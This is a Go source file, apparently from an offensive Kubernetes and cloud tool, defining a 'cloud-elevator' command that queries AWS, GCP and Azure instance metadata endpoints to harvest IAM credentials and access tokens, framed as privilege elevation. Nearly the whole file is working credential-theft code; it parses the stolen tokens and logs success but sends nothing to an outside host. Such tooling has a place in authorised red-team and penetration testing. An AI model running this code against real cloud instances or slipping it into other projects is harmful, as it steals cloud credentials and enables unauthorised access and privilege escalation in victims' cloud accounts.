package multi_cloud

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
)

var (
	// CloudElevatorCmd represents the command for the cloud elevation module
	CloudElevatorCmd = &cobra.Command{
		Use:   "cloud-elevator",
		Short: "Attempt to elevate privileges in cloud environments",
		RunE: func(cmd *cobra.Command, args []string) error {
			return elevateCloudPrivileges(cmd.Context())
		},
	}
)

type cloudMetadata struct {
	AccessToken string `json:"access_token"`
	TokenType   string `json:"token_type"`
	ExpiresIn   int    `json:"expires_in"`
}

func elevateCloudPrivileges(ctx context.Context) error {
	// Check for cloud metadata endpoints
	client := &http.Client{}

	// Check AWS
	if err := checkAWS(ctx, client); err != nil {
		logger.Warn("AWS elevation failed: %v", err)
	}

	// Check GCP
	if err := checkGCP(ctx, client); err != nil {
		logger.Warn("GCP elevation failed: %v", err)
	}

	// Check Azure
	if err := checkAzure(ctx, client); err != nil {
		logger.Warn("Azure elevation failed: %v", err)
	}

	return nil
}

func checkAWS(ctx context.Context, client *http.Client) error {
	// Check instance metadata
	req, err := http.NewRequestWithContext(ctx, "GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to access metadata: %v", err)
	}
	defer func() {
		if err := resp.Body.Close(); err != nil {
			logger.Warn("Failed to close response body: %v", err)
		}
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("metadata endpoint returned %d", resp.StatusCode)
	}

	// Read role name
	roleName, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read role name: %v", err)
	}

	// Get credentials
	req, err = http.NewRequestWithContext(ctx, "GET", fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", string(roleName)), nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	resp, err = client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to get credentials: %v", err)
	}
	defer func() {
		if err := resp.Body.Close(); err != nil {
			logger.Warn("Failed to close response body: %v", err)
		}
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("credentials endpoint returned %d", resp.StatusCode)
	}

	var creds map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&creds); err != nil {
		return fmt.Errorf("failed to parse credentials: %v", err)
	}

	logger.Info("Successfully obtained AWS credentials")
	return nil
}

func checkGCP(ctx context.Context, client *http.Client) error {
	// Check metadata endpoint
	req, err := http.NewRequestWithContext(ctx, "GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Metadata-Flavor", "Google")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to access metadata: %v", err)
	}
	defer func() {
		if err := resp.Body.Close(); err != nil {
			logger.Warn("Failed to close response body: %v", err)
		}
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("metadata endpoint returned %d", resp.StatusCode)
	}

	var token cloudMetadata
	if err := json.NewDecoder(resp.Body).Decode(&token); err != nil {
		return fmt.Errorf("failed to parse token: %v", err)
	}

	logger.Info("Successfully obtained GCP token")
	return nil
}

func checkAzure(ctx context.Context, client *http.Client) error {
	// Check managed identity endpoint
	req, err := http.NewRequestWithContext(ctx, "GET", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Metadata", "true")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to access metadata: %v", err)
	}
	defer func() {
		if err := resp.Body.Close(); err != nil {
			logger.Warn("Failed to close response body: %v", err)
		}
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("metadata endpoint returned %d", resp.StatusCode)
	}

	var token cloudMetadata
	if err := json.NewDecoder(resp.Body).Decode(&token); err != nil {
		return fmt.Errorf("failed to parse token: %v", err)
	}

	logger.Info("Successfully obtained Azure token")
	return nil
}
